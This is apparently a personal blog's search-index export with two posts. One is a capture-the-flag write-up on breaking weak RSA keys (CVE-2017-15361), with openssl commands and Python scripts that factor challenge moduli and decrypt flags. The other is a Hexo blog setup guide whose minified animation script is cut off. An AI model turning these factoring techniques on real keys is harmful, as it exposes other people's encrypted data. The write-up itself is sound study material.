<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>22-11-01-Qq</title>
    <url>/2022/11/01/22-11-01-qq/</url>
    <content><![CDATA[<p>The problem is mainly based on the <strong>backdoor</strong>. In RSA library, it has the CVE of <code>CVE-2017-15361</code>.In this case, we can calculate the prime which is likely random with the equation that:<br>$$<br>Prime &#x3D; k \times M + (65537^{a} \mod M)<br>$$<br>It means that produce the list of primes and make them to collide， which satisfy the condition, thus output the target prime.</p>
<p>Also，the PKI system has different standards， we make some distinctions between different standards. </p>
<span id="more"></span>

<h1 id="RSA-Backdoor"><a href="#RSA-Backdoor" class="headerlink" title="RSA Backdoor"></a>RSA Backdoor</h1><blockquote>
<p>reference: <a href="https://asecuritysite.com/encryption/copper">https://asecuritysite.com/encryption/copper</a></p>
</blockquote>
<h2 id="description"><a href="#description" class="headerlink" title="description"></a>description</h2><p>In RSALib, the prime is produced by the equaction:<br>$$<br>Prime &#x3D; k \times M + 65537^{a} \mod M<br>$$<br>which means that the $M$ is the multiplication of the generated primes.<br>$$<br>M &#x3D; \prod_{i&#x3D;1}^{n}{P_{i}}&#x3D; P_{1} \times P_{2} \times \cdots \times P_{n}<br>$$<br>$M$ must be large and is around the same size of they generated. The weakness is the $k$ and $a$ are relatively small values. The entropy is also must drop. </p>
<p>The problem is common provided with $c$, $e$ and $n$, and just do the command<code>RSA_Backdoor(n)</code>. If the problems satisfy the conditions, the  function will return the $p$ and the $q$.</p>
<h1 id="Openssl"><a href="#Openssl" class="headerlink" title="Openssl"></a>Openssl</h1><blockquote>
<p>relate to the PKI system.</p>
</blockquote>
<h2 id="generate"><a href="#generate" class="headerlink" title="generate"></a>generate</h2><p>In kali, you can directly input the command that <code>openssl</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl genrsa -out [pri].pem 1024</span><br><span class="line">openssl rsa -in [pri].pem -pubout -out [pub].pem</span><br><span class="line"></span><br><span class="line">## if needs to encrypto, like AES or anything else</span><br><span class="line">openssl genrsa [-aes256 -passout pass:111111] -out [pri].key 2048</span><br><span class="line">openssl rsa -in [pri].key -pubout -out [pri].key</span><br><span class="line">Enter pass phrase for [pri].key:</span><br><span class="line"># openssl rsa -in [pri].key -passin pass:111111 -pubout -out [pub].key</span><br><span class="line">writing RSA key</span><br></pre></td></tr></table></figure>



<p>If in python, we can import something to ensure the same consequence. </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="comment"># RSA.generate(bits, randfunc = None, e = 65537)</span></span><br><span class="line"><span class="comment"># - bits: bit_length</span></span><br><span class="line"><span class="comment"># - randfunc: Crypto.Random.get_random_bytes()</span></span><br><span class="line"><span class="comment"># - e(int): odd, common is 65537</span></span><br><span class="line">rsa = rsa.generate(<span class="number">1024</span>)</span><br><span class="line"><span class="comment"># export prikey</span></span><br><span class="line">pri = rsa.exportKey()</span><br><span class="line"><span class="comment"># export pubkey</span></span><br><span class="line">pub = rsa.publickey().exportKey()</span><br><span class="line"><span class="comment"># or write in the file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pri.pem&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f1:</span><br><span class="line">    f1.write(pri)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pub.pem&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f2:</span><br><span class="line">    f2.write(pub)</span><br></pre></td></tr></table></figure>



<h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># PKCS1 -&gt; PKCS8 privatekey</span><br><span class="line">openssl pkcs8 -topk8 -inform PEM -in rsa_pri.pem -outform PEM -nocrypt -out rsa_pri_pkcs8.pem</span><br><span class="line"></span><br><span class="line"># PKCS8 -&gt; PKCS1 privatekey</span><br><span class="line">openssl rsa -inform PEM -in rsa_pri_pkcs8.pem -outform PEM -out rsa_pri_pkcs1.pem</span><br><span class="line"></span><br><span class="line"># PKCS8 -&gt; PKCS1 publickey</span><br><span class="line">openssl rsa -pubin -in rsa_pub.pem -RSAPublicKey_out -out rsa_pub_pkcs1.pem</span><br><span class="line"></span><br><span class="line"># PKCS1 -&gt; PKCS8 publickey</span><br><span class="line">openssl rsa -RSAPublicKey_in -in rsa_pub_pkcs1.pem -pubout -out rsa_pub_pkcs8.pem</span><br></pre></td></tr></table></figure>



<h1 id="Key-Differences"><a href="#Key-Differences" class="headerlink" title="Key_Differences"></a>Key_Differences</h1><h2 id="PKCS-8"><a href="#PKCS-8" class="headerlink" title="PKCS#8"></a>PKCS#8</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># pubkey</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line"></span><br><span class="line"># prikey</span><br><span class="line">-----BEGIN PRIVATE KEY-----</span><br><span class="line">-----END PRIVATE KEY-----</span><br><span class="line"></span><br><span class="line"># prikey encrypted</span><br><span class="line">-----BEGIN PRIVATE KEY-----</span><br><span class="line">-----END PRIVATE KEY-----</span><br></pre></td></tr></table></figure>



<h2 id="PKCS-1"><a href="#PKCS-1" class="headerlink" title="PKCS#1"></a>PKCS#1</h2><blockquote>
<p>import rsa</p>
<p>the default is PKCS#1</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># pubkey</span><br><span class="line">-----BEGIN RSA PUBLIC KEY-----</span><br><span class="line">-----END RSA PUBLIC KEY-----</span><br><span class="line"></span><br><span class="line"># prikey</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>



<h1 id="Rsatool"><a href="#Rsatool" class="headerlink" title="Rsatool"></a>Rsatool</h1><blockquote>
<p><a href="https://github.com/ius/rsatool">GitHub - ius&#x2F;rsatool: rsatool can be used to calculate RSA and RSA-CRT parameters</a></p>
</blockquote>
<h2 id="requirements"><a href="#requirements" class="headerlink" title="requirements"></a>requirements</h2><ul>
<li>python3.7+</li>
<li>pyasn1</li>
<li>gmpy2</li>
</ul>
<h2 id="usage"><a href="#usage" class="headerlink" title="usage"></a>usage</h2><h3 id="pem"><a href="#pem" class="headerlink" title="pem"></a>pem</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 rsatool.py -f PEM -o key.pem -n [n] -d [d]</span><br><span class="line">python3 rsatool.py -f PEM -o private.pem -p [p] -q [q] -e [e]</span><br></pre></td></tr></table></figure>



<h3 id="der"><a href="#der" class="headerlink" title="der"></a>der</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 rsatool.py -f DER -o key.der -p [p] -q [q]</span><br></pre></td></tr></table></figure>



<h1 id="Pem-in-RSA"><a href="#Pem-in-RSA" class="headerlink" title="Pem in RSA"></a>Pem in RSA</h1><p>The pem can be used in different ways in RSA.</p>
<p>One is to extract the $n$ and the $e$—— when you get $p$, $q$ from the $n$, we can change <code>flag.enc</code> to $c$ by using the function <code>bytes_to_long()</code>.</p>
<p>The other way is also extract the $n$ and the $e$ ——however, we MUST construct the primes and others into the <code>pri.pem</code>. Using the <code>pri.pem</code>，and we can decrypt the <code>flag.enc</code> to get the message.</p>
<h2 id="1101-qq"><a href="#1101-qq" class="headerlink" title="[1101]qq"></a>[1101]qq</h2><blockquote>
<p>mainly using bytes_to_long()</p>
</blockquote>
<h3 id="flag-enc"><a href="#flag-enc" class="headerlink" title="flag.enc"></a>flag.enc</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CwhE2kUKvphGegBRgnZeM8iE2oTPfmzMYfL4cO262NkQpId+JzH4pEyiS3cdyhDRsU+huX9cnIE=</span><br></pre></td></tr></table></figure>



<h3 id="pub-key-pem"><a href="#pub-key-pem" class="headerlink" title="pub_key.pem"></a>pub_key.pem</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MFMwDQYJKoZIhvcNAQEBBQADQgAwPwI4EkoKC0EfUXgDvsQUYRI+j0/XPrqQxHJ+</span><br><span class="line">v3CKL9WVp5SMk0Njud03to6sxuvPt93fSGHkAsW+wHsCAwEAAQ==</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure>



<h3 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pub_key.pem&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pub = RSA.import_key(f.read())</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(pub.e)</span></span><br><span class="line"><span class="comment"># print(pub.n)</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.enc&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    cipher = base64.b64decode(f.read())</span><br><span class="line">c = bytes_to_long(cipher)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">51926993165717444667250925590498598946377319881662556610174970468991791873398735735101740226707561968771963673353253102616246155657339</span></span><br><span class="line">p, q = RSA_Backdoor(n)</span><br><span class="line">N = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">int</span>(gmpy2.invert(e, N))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m).decode())</span><br><span class="line"><span class="comment"># 2761328357323929478367647741211050583178552594955214217850793389028221</span></span><br><span class="line"><span class="comment"># flag&#123;We@k_Pr1me_1s_d@nger0us&#125;</span></span><br></pre></td></tr></table></figure>



<h2 id="ACTF2018-可怜的RSA"><a href="#ACTF2018-可怜的RSA" class="headerlink" title="[ACTF2018]可怜的RSA"></a>[ACTF2018]可怜的RSA</h2><blockquote>
<p>construct to private key</p>
</blockquote>
<h3 id="flag-enc-1"><a href="#flag-enc-1" class="headerlink" title="flag.enc"></a>flag.enc</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GVd1d3viIXFfcHapEYuo5fAvIiUS83adrtMW/MgPwxVBSl46joFCQ1plcnlDGfL19K/3PvChV6n5QGohzfVyz2Z5GdTlaknxvHDUGf5HCukokyPwK/1EYU7NzrhGE7J5jPdi0Aj7xi/Odxy0hGMgpaBLd/nL3N8O6i9pc4Gg3O8soOlciBG/6/xdfN3SzSStMYIN8nfZZMSq3xDDvz4YB7TcTBh4ik4wYhuC77gmT+HWOv5gLTNQ3EkZs5N3EAopy11zHNYU80yv1jtFGcluNPyXYttU5qU33jcp0Wuznac+t+AZHeSQy5vk8DyWorSGMiS+J4KNqSVlDs12EqXEqqJ0uA==</span><br></pre></td></tr></table></figure>



<h3 id="public-key"><a href="#public-key" class="headerlink" title="public.key"></a>public.key</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIIBJDANBgkqhkiG9w0BAQEFAAOCAREAMIIBDAKCAQMlsYv184kJfRcjeGa7Uc/4</span><br><span class="line">3pIkU3SevEA7CZXJfA44bUbBYcrf93xphg2uR5HCFM+Eh6qqnybpIKl3g0kGA4rv</span><br><span class="line">tcMIJ9/PP8npdpVE+U4Hzf4IcgOaOmJiEWZ4smH7LWudMlOekqFTs2dWKbqzlC59</span><br><span class="line">NeMPfu9avxxQ15fQzIjhvcz9GhLqb373XDcn298ueA80KK6Pek+3qJ8YSjZQMrFT</span><br><span class="line">+EJehFdQ6yt6vALcFc4CB1B6qVCGO7hICngCjdYpeZRNbGM/r6ED5Nsozof1oMbt</span><br><span class="line">Si8mZEJ/Vlx3gathkUVtlxx/+jlScjdM7AFV5fkRidt0LkwosDoPoRz/sDFz0qTM</span><br><span class="line">5q5TAgMBAAE=</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure>



<h3 id="exp-py-1"><a href="#exp-py-1" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">2. public.key：rb-&gt;RSA.import_key-&gt;e,n</span></span><br><span class="line"><span class="string">3. construct to privatekey</span></span><br><span class="line"><span class="string">    1. (n,e,d,(p),(q)) to save</span></span><br><span class="line"><span class="string">    2. RSA.construct() to construct</span></span><br><span class="line"><span class="string">    3. 2.exportKey() import</span></span><br><span class="line"><span class="string">    4. RSA.importKey() export</span></span><br><span class="line"><span class="string">    5. PKCS1_OAEP.new()  -&gt; important!</span></span><br><span class="line"><span class="string">4. d by using invert(), and int(d) to get integer</span></span><br><span class="line"><span class="string">5. use private key to decrypt</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;public.key&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pub = RSA.import_key(f.read())</span><br><span class="line">e = pub.e</span><br><span class="line">n = pub.n</span><br><span class="line"><span class="comment"># e = 65537</span></span><br><span class="line"><span class="comment"># n = 79832181757332818552764610761349592984614744432279135328398999801627880283610900361281249973175805069916210179560506497075132524902086881120372213626641879468491936860976686933630869673826972619938321951599146744807653301076026577949579618331502776303983485566046485431039541708467141408260220098592761245010678592347501894176269580510459729633673468068467144199744563731826362102608811033400887813754780282628099443490170016087838606998017490456601315802448567772411623826281747245660954245413781519794295336197555688543537992197142258053220453757666537840276416475602759374950715283890232230741542737319569819793988431443</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># yafu-x64/factordb.com</span></span><br><span class="line">p = <span class="number">3133337</span></span><br><span class="line">q = <span class="number">25478326064937419292200172136399497719081842914528228316455906211693118321971399936004729134841162974144246271486439695786036588117424611881955950996219646807378822278285638261582099108339438949573034101215141156156408742843820048066830863814362379885720395082318462850002901605689761876319151147352730090957556940842144299887394678743607766937828094478336401159449035878306853716216548374273462386508307367713112073004011383418967894930554067582453248981022011922883374442736848045920676341361871231787163441467533076890081721882179369168787287724769642665399992556052144845878600126283968890273067575342061776244939</span></span><br><span class="line">N = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">int</span>(gmpy2.invert(e, N))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.enc&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    cipher = b64decode(f.read())</span><br><span class="line">    <span class="comment"># print(c)</span></span><br><span class="line">con = RSA.construct((n, e, d, p, q))</span><br><span class="line">pri = PKCS1_OAEP.new(RSA.importKey(con.exportKey()))</span><br><span class="line">m = pri.decrypt(cipher)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment"># b&#x27;afctf&#123;R54_|5_$0_B0rin9&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>RSA</tag>
        <tag>openssl</tag>
        <tag>factor</tag>
        <tag>backdoor</tag>
      </tags>
  </entry>
  <entry>
    <title>22-10-21-Hexo-Build-Beautify</title>
    <url>/2022/10/21/22-10-21-hexo-build-beautify/</url>
    <content><![CDATA[<p>The article is used to record how to use hexo to build my own blog. I will try my best to make records by using English. To Be Honest, this is really somewhat a hard challenge for me.</p>
<p>The problems and some solutions are as follows.</p>
<span id="more"></span>

<blockquote>
<p><a href="https://hexo-next.readthedocs.io/">https://hexo-next.readthedocs.io/</a></p>
</blockquote>
<h1 id="BUILD-HEXO"><a href="#BUILD-HEXO" class="headerlink" title="BUILD HEXO"></a>BUILD HEXO</h1><blockquote>
<p>preparation: </p>
<p>git</p>
<p>node.js</p>
</blockquote>
<p>after the installation, test: </p>
<p><code>node -v</code>&#x2F;<code>npm -v</code>&#x2F; <code>git -v</code></p>
<h2 id="HEXO-BLOG"><a href="#HEXO-BLOG" class="headerlink" title="HEXO BLOG"></a>HEXO BLOG</h2><blockquote>
<p>all use git-bash</p>
</blockquote>
<ul>
<li>to install hexo:</li>
</ul>
<p><code>npm install -g hexo-cli</code></p>
<ul>
<li>init hexo and build blog:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo init [blogname]</span><br><span class="line">cd [blogname]</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>

<ul>
<li>after building the common commands:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo generate/hexo g</span><br><span class="line">hexo server/hexo s</span><br><span class="line">hexo deploy/hexo d(unless everything is OK)</span><br><span class="line"># hexo clean &amp;&amp; hexo g &amp; hexo s</span><br></pre></td></tr></table></figure>

<h2 id="NEW-POST"><a href="#NEW-POST" class="headerlink" title="NEW POST"></a>NEW POST</h2><ul>
<li>set markdown</li>
</ul>
<p>In <code>scaffolds\post.md</code>, above the <code>!--more--</code> can make the article excerption</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: &#123;&#123; title &#125;&#125;</span><br><span class="line">date: &#123;&#123; date &#125;&#125;</span><br><span class="line">categories: </span><br><span class="line">tags: </span><br><span class="line">mathjax: true</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">&lt;!--more--&gt;</span><br><span class="line"># to limit the length of article</span><br></pre></td></tr></table></figure>

<ul>
<li>new post</li>
</ul>
<p><code>hexo new [postname]</code></p>
<p>To make the article and everting clean, follow the standard <code>YY-MM-DD-article-name.md</code></p>
<p>And the categories are as follows: </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">categories:</span><br><span class="line">	- Studying</span><br><span class="line">	- Reading</span><br><span class="line">	- Recording</span><br><span class="line">	- Amusing</span><br></pre></td></tr></table></figure>



<h1 id="DRAFT-x2F-BAND-GITHUB-amp-TOKEN"><a href="#DRAFT-x2F-BAND-GITHUB-amp-TOKEN" class="headerlink" title="DRAFT&#x2F;BAND GITHUB&amp;TOKEN"></a>DRAFT&#x2F;BAND GITHUB&amp;TOKEN</h1><ul>
<li>register the github account</li>
<li>new repository</li>
</ul>
<p>Create a new repository, github has reserved your own website.</p>
<p><code>[githubaccount].github.io</code></p>
<ul>
<li>use token to authenticate</li>
</ul>
<p>In the root menu, add the follows to the file <strong>_config.yml</strong>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># install:</span><br><span class="line">npm install hexo-deployer-git --save</span><br><span class="line"></span><br><span class="line"># _config.yml</span><br><span class="line"># Deployment</span><br><span class="line">## Docs: https://hexo.io/docs/one-command-deployment</span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: https://[token]@github.com/[githubaccount]/[githubaccount].github.io</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>

<ul>
<li>git config</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># if authentication failed</span><br><span class="line">git config --globaluser.name &quot;yourname&quot;</span><br><span class="line">git config --global user.email &quot;youremail&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>after everything above is ready</li>
</ul>
<p><code>hexo d</code>, test if the running is well.</p>
<p>the default website is: <code>localhost:4000/</code></p>
<h1 id="MATH"><a href="#MATH" class="headerlink" title="MATH"></a>MATH</h1><p>If the markdown can not display well,  maybe the renderer gets wrong.</p>
<p>The hexo default renderer is <code>hexo-renderer-marked</code>.</p>
<p>You can use <code>hexo-renderer-kramed</code> or <code>@upupming/renderer-markdown-it-plus</code> to replace the default one.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm uninstall hexo-renderer-marked --save</span><br><span class="line">npm i @upupming/hexo-renderer-markdown-it-plus --save</span><br></pre></td></tr></table></figure>

<p><strong>DON’T FORGET!</strong></p>
<p>In <code>_config.next.yml</code> set: </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">math:</span><br><span class="line">  # Default (false) will load mathjax / katex script on demand.</span><br><span class="line">  # That is it only render those page which has `mathjax: true` in front-matter.</span><br><span class="line">  # If you set it to true, it will load mathjax / katex script EVERY PAGE.</span><br><span class="line">  every_page: true</span><br><span class="line"></span><br><span class="line">  mathjax:</span><br><span class="line">    enable: true</span><br><span class="line">    # Available values: none | ams | all</span><br><span class="line">    tags: none</span><br><span class="line"></span><br><span class="line">  katex:</span><br><span class="line">    enable: false</span><br><span class="line">    # See: https://github.com/KaTeX/KaTeX/tree/master/contrib/copy-tex</span><br><span class="line">    copy_tex: false</span><br></pre></td></tr></table></figure>

<p>and in your every post fonts, add <code>math: true</code></p>
<h1 id="NOT-404"><a href="#NOT-404" class="headerlink" title="NOT 404"></a>NOT 404</h1><h2 id="question"><a href="#question" class="headerlink" title="question"></a>question</h2><p>When I visit the tags, the website always return <code>404</code>. I search for some solutions all over the web. However, most of them are wrong, until I see the solution in the Zhihu.</p>
<h2 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h2><h3 id="new-page"><a href="#new-page" class="headerlink" title="new page"></a>new page</h3><p>In the root of the blog, open the git bash command.</p>
<p><code>hexo new page &quot;tags&quot;</code></p>
<h3 id="edit-the-index"><a href="#edit-the-index" class="headerlink" title="edit the index"></a>edit the index</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: tags</span><br><span class="line">type: tags</span><br><span class="line">layout: tags # /theme/next/layout/[tags].njk</span><br><span class="line">---</span><br></pre></td></tr></table></figure>

<p><em>Behind the layout, to write down <strong>the name of the target njk</strong>, which is in the depth of the file path.</em></p>
<h3 id="edit-the-config-file"><a href="#edit-the-config-file" class="headerlink" title="edit the _config file"></a>edit the _config file</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Dirctory</span><br><span class="line">tag_dir: tags</span><br></pre></td></tr></table></figure>

<p>Make the names one-to-one.</p>
<h1 id="CALCULATE-WORDS"><a href="#CALCULATE-WORDS" class="headerlink" title="CALCULATE WORDS"></a>CALCULATE WORDS</h1><h2 id="hexo-word-counter"><a href="#hexo-word-counter" class="headerlink" title="hexo-word-counter"></a>hexo-word-counter</h2><p>Install the plugin <code>hexo-word-counter</code>, in the root path of blog. </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-word-counter</span><br><span class="line">hexo clean &amp;&amp; hexo g</span><br></pre></td></tr></table></figure>

<h2 id="config"><a href="#config" class="headerlink" title="config"></a>config</h2><p>In <code>_config.yml</code>, at the end of the file add the follows: </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">symbols_count_time:</span><br><span class="line">  symbols: true</span><br><span class="line">  time: true</span><br><span class="line">  total_symbols: true</span><br><span class="line">  total_time: true</span><br><span class="line">  exclude_codeblock: false</span><br><span class="line">  awl: 4</span><br><span class="line">  wpm: 275</span><br><span class="line">  suffix: &quot;mins.&quot;</span><br></pre></td></tr></table></figure>

<p><em>In <code>_config.next.yml</code>, edit the finding <code>item_text_total: false</code>. Change <code>false</code> to <code>true</code>.</em></p>
<h1 id="BACKGROUND-PICTURE"><a href="#BACKGROUND-PICTURE" class="headerlink" title="BACKGROUND PICTURE"></a>BACKGROUND PICTURE</h1><p>I tried more ways to set background picture, more thins were wrong. Util I saw an article, I done this thing.</p>
<p>When I reflected all my things on this part, I knew the keypoint part was to **add the correct source path **to <code>next_config</code>.</p>
<h2 id="js-file"><a href="#js-file" class="headerlink" title="js file"></a>js file</h2><p>The NexT v8 has the <code>canvas-nest.js</code> in <code>themes\next\source\js</code>.</p>
<p>If you don’t have the <strong>JS</strong> file, create the new file contains：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">!<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">function</span> <span class="title function_">n</span>(<span class="params">n,e,t</span>)&#123;<span class="keyword">return</span> n.<span class="title function_">getAttribute</span>(e)||t&#125;<span class="keyword">function</span> <span class="title function_">e</span>(<span class="params">n</span>)&#123;<span class="keyword">return</span> <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(n)&#125;<span class="keyword">function</span> <span class="title function_">t</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> t=<span class="title function_">e</span>(<span class="string">&quot;script&quot;</span>),o=t.<span class="property">length</span>,i=t[o-<span class="number">1</span>];<span class="keyword">return</span>&#123;<span class="attr">l</span>:o,<span class="attr">z</span>:<span class="title function_">n</span>(i,<span class="string">&quot;zIndex&quot;</span>,-<span class="number">1</span>),<span class="attr">o</span>:<span class="title function_">n</span>(i,<span class="string">&quot;opacity&quot;</span>,<span class="number">.5</span>),<span class="attr">c</span>:<span class="title function_">n</span>(i,<span class="string">&quot;color&quot;</span>,<span class="string">&quot;0,0,0&quot;</span>),<span class="attr">n</span>:<span class="title function_">n</span>(i,<span class="string">&quot;count&quot;</span>,<span class="number">99</span>)&#125;&#125;<span class="keyword">function</span> <span class="title function_">o</span>(<span class="params"></span>)&#123;c=u.<span class="property">width</span>=<span class="variable language_">window</span>.<span class="property">innerWidth</span>||<span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">clientWidth</span>||<span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">clientWidth</span>,a=u.<span class="property">height</span>=<span class="variable language_">window</span>.<span class="property">innerHeight</span>||<span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">clientHeight</span>||<span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">clientHeight</span>&#125;<span class="keyword">function</span> <span class="title function_">i</span>(<span class="params"></span>)&#123;l.<span class="title function_">clearRect</span>(<span class="number">0</span>,<span class="number">0</span>,c,a);<span class="keyword">var</span> n,e,t,o,u,d,x=[w].<span class="title function_">concat</span>(y);y.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">i</span>)&#123;<span class="keyword">for</span>(i.<span class="property">x</span>+=i.<span class="property">xa</span>,i.<span class="property">y</span>+=i.<span class="property">ya</span>,i.<span class="property">xa</span>*=i.<span class="property">x</span>&gt;c||i.<span class="property">x</span>&lt;<span class="number">0</span>?-<span class="number">1</span>:<span class="number">1</span>,i.<span class="property">ya</span>*=i.<span class="property">y</span>&gt;a||i.<span class="property">y</span>&lt;<span class="number">0</span>?-<span class="number">1</span>:<span class="number">1</span>,l.<span class="title function_">fillRect</span>(i.<span class="property">x</span>-<span class="number">.5</span>,i.<span class="property">y</span>-<span class="number">.5</span>,<span class="number">1</span>,<span class="number">1</span>),e=<span class="number">0</span>;e&lt;x.<span class="property">length</span>;e++)n=x[e],i!==n&amp;&amp;<span class="literal">null</span>!==n.<span class="property">x</span>&amp;&amp;<span class="literal">null</span>!==n.<span class="property">y</span>&amp;&amp;(o=i.<span class="property">x</span>-n.<span class="property">x</span>,u=i.<span class="property">y</span>-n.<span class="property">y</span>,d=o*o+u*u,d&lt;n.<span class="property">max</span>&amp;&amp;(n===w&amp;&amp;d&gt;=n.<span class="property">max</span>/<span class="number">2</span>&amp;&amp;(i.<span class="property">x</span>-=<span class="number">.03</span>*o,i.<span class="property">y</span>-=<span class="number">.03</span>*u),t=(n.<span class="property">max</span>-d)/n.<span class="property">max</span>,l.<span class="title function_">beginPath</span>(),l.<span class="property">lineWidth</span>=t/<span class="number">2</span>,l.<span class="property">strokeStyle</span>=<span class="string">&quot;rgba(&quot;</span>+m.<span class="property">c</span>+<span class="string">&quot;,&quot;</span>+(t+<span class="number">.2</span>)+<span class="string">&quot;)&quot;</span>,l.<span class="title function_">moveTo</span>(i.<span class="property">x</span>,i.<span class="property">y</span>),l.<span class="title function_">lineTo</span>(n.<span class="property">x</span>,n.<span class="property">y</span>),l.<span class="title function_">stroke</span>()));x.<span class="title function_">splice</span>(x.<span class="title function_">indexOf</span>(i),<span class="number">1</span>)&#125;),<span class="title function_">r</span>(i)&#125;<span class="keyword">var</span> c,a,u=<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;canvas&quot;</span>),m=<span class="title function_">t</span>(),d=<span class="string">&quot;c_n&quot;</span>+m.<span class="property">l</span>,l=u.<span class="title function_">getContext</span>(<span class="string">&quot;2d&quot;</span>),r=<span class="variable language_">window</span>.<span class="property">requestAnimationFrame</span>||<span class="variable language_">window</span>.<span class="property">webkitRequestAnimationFrame</span>||<span class="variable language_">window</span>.<span class="property">mozRequestAnimationFrame</span>||<span class="variable language_">window</span>.<span class="property">oRequestAnimationFrame</span>||<span class="variable 